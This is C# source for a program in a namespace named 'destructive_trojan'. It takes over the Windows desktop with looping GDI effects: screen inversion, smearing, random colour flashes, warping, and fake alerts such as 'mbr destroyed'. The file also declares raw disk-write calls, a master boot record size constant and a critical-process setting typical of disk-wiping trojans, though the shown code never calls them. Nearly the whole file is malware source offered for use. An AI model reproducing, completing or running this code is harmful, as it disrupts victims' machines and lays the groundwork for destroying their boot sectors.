using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace destructive_trojan
{
    public class Class1
    {
        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32.dll")]
        static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hwnd);
        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(int crColor);
        [DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
        public static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest,
        int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        BLENDFUNCTION blendFunction);
        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll")]
        static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
        int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
        int yMask);
        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
        public static extern bool DeleteDC(IntPtr hdc);
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        //dwCreationDisposition
        private const uint OpenExisting = 0x3;

        //dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hHandle);
        enum TernaryRasterOperations : uint
        {
            /// <summary>dest = source</summary>
            SRCCOPY = 0x00CC0020,
            /// <summary>dest = source OR dest</summary>
            SRCPAINT = 0x00EE0086,
            /// <summary>dest = source AND dest</summary>
            SRCAND = 0x008800C6,
            /// <summary>dest = source XOR dest</summary>
            SRCINVERT = 0x00660046,
            /// <summary>dest = source AND (NOT dest)</summary>
            SRCERASE = 0x00440328,
            /// <summary>dest = (NOT source)</summary>
            NOTSRCCOPY = 0x00330008,
            /// <summary>dest = (NOT src) AND (NOT dest)</summary>
            NOTSRCERASE = 0x001100A6,
            /// <summary>dest = (source AND pattern)</summary>
            MERGECOPY = 0x00C000CA,
            /// <summary>dest = (NOT source) OR dest</summary>
            MERGEPAINT = 0x00BB0226,
            /// <summary>dest = pattern</summary>
            PATCOPY = 0x00F00021,
            /// <summary>dest = DPSnoo</summary>
            PATPAINT = 0x00FB0A09,
            /// <summary>dest = pattern XOR dest</summary>
            PATINVERT = 0x005A0049,
            /// <summary>dest = (NOT dest)</summary>
            DSTINVERT = 0x00550009,
            /// <summary>dest = BLACK</summary>
            BLACKNESS = 0x00000042,
            /// <summary>dest = WHITE</summary>
            WHITENESS = 0x00FF0062,
            /// <summary>
            /// Capture window as seen on screen.  This includes layered windows
            /// such as WPF windows with AllowsTransparency="true"
            /// </summary>
            CAPTUREBLT = 0x40000000
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }

            public static implicit operator System.Drawing.Point(POINT p)
            {
                return new System.Drawing.Point(p.X, p.Y);
            }

            public static implicit operator POINT(System.Drawing.Point p)
            {
                return new POINT(p.X, p.Y);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct BLENDFUNCTION
        {
            byte BlendOp;
            byte BlendFlags;
            byte SourceConstantAlpha;
            byte AlphaFormat;

            public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
            {
                BlendOp = op;
                BlendFlags = flags;
                SourceConstantAlpha = alpha;
                AlphaFormat = format;
            }
        }

        //
        // currently defined blend operation
        //
        const int AC_SRC_OVER = 0x00;

        //
        // currently defined alpha format
        //
        const int AC_SRC_ALPHA = 0x01;

        public static Icon Extract(string file, int number, bool largeIcon)
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }
        }
        public static void Main()
        {
            //THREADS
            Class1 gdi_nonstatic = new Class1();
            Thread gdi = new Thread(gdi_nonstatic.GDI_payloads);
            gdi.Start();
        }
        Random r;
        int count = 1000;
        int x = Screen.PrimaryScreen.Bounds.Width;
        int y = Screen.PrimaryScreen.Bounds.Height;
        int left = Screen.PrimaryScreen.Bounds.Left;
        int top = Screen.PrimaryScreen.Bounds.Top;
        int right = Screen.PrimaryScreen.Bounds.Right;
        int bottom = Screen.PrimaryScreen.Bounds.Bottom;
        bool gdi_text = false;
        Icon some_ico = Extract("shell32.dll", 232, true);
        public void GDI_payloads()
        {
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            IntPtr desktop = GetDC(IntPtr.Zero);
            IntPtr rndcolor = CreateSolidBrush(0);
            IntPtr mhdc = CreateCompatibleDC(hdc);
            IntPtr hbit = CreateCompatibleBitmap(hdc, x, y);
            IntPtr holdbit = SelectObject(mhdc, hbit);
            POINT[] lppoint = new POINT[3];
            for(int num = 0; num < 100; num++)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                DeleteDC(hdc);
                if (count > 51)
                    Thread.Sleep(count -= 50);
                else
                    Thread.Sleep(50);
            }
            for(int num = 0; num < 300; num++)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                DeleteDC(hdc);
                int posX = Cursor.Position.X;
                int posY = Cursor.Position.Y;
                desktop = GetDC(IntPtr.Zero);
                using(Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawIcon(some_ico, posX, posY);
                }
                ReleaseDC(IntPtr.Zero, desktop);
                Thread.Sleep(50);
            }
            for (int num = 0; num < 500; num++)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, 0, r.Next(10), r.Next(x), y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                DeleteDC(hdc);
                if (r.Next(30) == 1)
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(r.Next(25));
            }
            clear_screen();
            Thread gdi2 = new Thread(GDI_payloads2);
            gdi2.Start();
            for(int num = 0; num < 500; num++)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, r.Next(-300, x), r.Next(-300, y), r.Next(x/2), r.Next(y/2), hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(50);
            }
            clear_screen();
            for (int num = 0; num < 700; num++)
            {
                if(num < 300)
                {
                    hwnd = GetDesktopWindow();
                    hdc = GetWindowDC(hwnd);
                    rndcolor = CreateSolidBrush(r.Next(100000000));
                    SelectObject(hdc, rndcolor);
                    BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                    DeleteObject(rndcolor);
                    DeleteDC(hdc);
                    Thread.Sleep(50);
                }
                else if(num < 500)
                {
                    hwnd = GetDesktopWindow();
                    hdc = GetWindowDC(hwnd);
                    rndcolor = CreateSolidBrush(r.Next(100000000));
                    SelectObject(hdc, rndcolor);
                    BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                    BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, TernaryRasterOperations.SRCERASE);
                    BitBlt(hdc, r.Next(-300, x), r.Next(-300, y), r.Next(x / 2), r.Next(y / 2), hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                    DeleteObject(rndcolor);
                    DeleteDC(hdc);
                    Thread.Sleep(50);
                }
                else
                {
                    hwnd = GetDesktopWindow();
                    hdc = GetWindowDC(hwnd);
                    rndcolor = CreateSolidBrush(r.Next(100000000));
                    SelectObject(hdc, rndcolor);
                    BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                    BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, TernaryRasterOperations.SRCINVERT);
                    DeleteObject(rndcolor);
                    DeleteDC(hdc);
                    Thread.Sleep(50);
                }
            }
            clear_screen();
            gdi_text = true;
            for (int num = 0; num < 500; num++)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                lppoint[0].X = left + r.Next(25);
                lppoint[0].Y = top + r.Next(25);
                lppoint[1].X = right - r.Next(25);
                lppoint[1].Y = top;
                lppoint[2].X = left + r.Next(25);
                lppoint[2].Y = bottom - r.Next(25);
                PlgBlt(hdc, lppoint, hdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
                mhdc = CreateCompatibleDC(hdc);
                hbit = CreateCompatibleBitmap(hdc, x, y);
                holdbit = SelectObject(mhdc, hbit);
                if (r.Next(3) == 1)
                    rndcolor = CreateSolidBrush(100);
                else if(r.Next(3) == 2)
                    rndcolor = CreateSolidBrush(100000);
                else if (r.Next(3) == 0)
                    rndcolor = CreateSolidBrush(100000000);
                SelectObject(mhdc, rndcolor);
                Rectangle(mhdc, left, top, right, bottom);
                AlphaBlend(hdc, 0, 0, x, y, mhdc, 0, 0, x, y, new BLENDFUNCTION(0, 0, 10, 0));
                SelectObject(mhdc, holdbit);
                DeleteObject(hbit);
                DeleteDC(hdc);
                Thread.Sleep(10);
            }
            Environment.Exit(-1);
        }
        public void GDI_payloads2()
        {
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            IntPtr desktop = GetDC(IntPtr.Zero);
            int num_count = 1000;
            r = new Random();
            for(; ; )
            {
                if (!gdi_text)
                {
                    hwnd = GetDesktopWindow();
                    hdc = GetWindowDC(hwnd);
                    BitBlt(hdc, r.Next(20), r.Next(20), x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                    DeleteDC(hdc);
                    if (num_count > 51)
                        Thread.Sleep(num_count -= 50);
                    else
                        Thread.Sleep(5);
                }
                else
                {
                    desktop = GetDC(IntPtr.Zero);
                    using (Graphics g = Graphics.FromHdc(desktop))
                    {
                        String[] rndtext = { "?Where am I", "system is corrupted", "th1s is cr4zy", "OMG", "mbr destroyed" };
                        Font drawFont = new Font("Arial", r.Next(10, 70));
                        SolidBrush drawBrush = new SolidBrush(Color.Pink);
                        int xp = r.Next(x);
                        int yp = r.Next(y);
                        StringFormat drawFormat = new StringFormat();
                        drawFormat.FormatFlags = StringFormatFlags.DirectionRightToLeft;
                        if(r.Next(5) == 0)
                        {
                            g.DrawString(rndtext[r.Next(4)], drawFont, drawBrush, xp, yp, drawFormat);
                        }
                        ReleaseDC(IntPtr.Zero, desktop);
                        Thread.Sleep(5);
                    }
                }
            }
        }
        public void clear_screen()
        {
            for(int num = 0; num < 10; num++)
            {
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(10);
            }
        }
    }
}
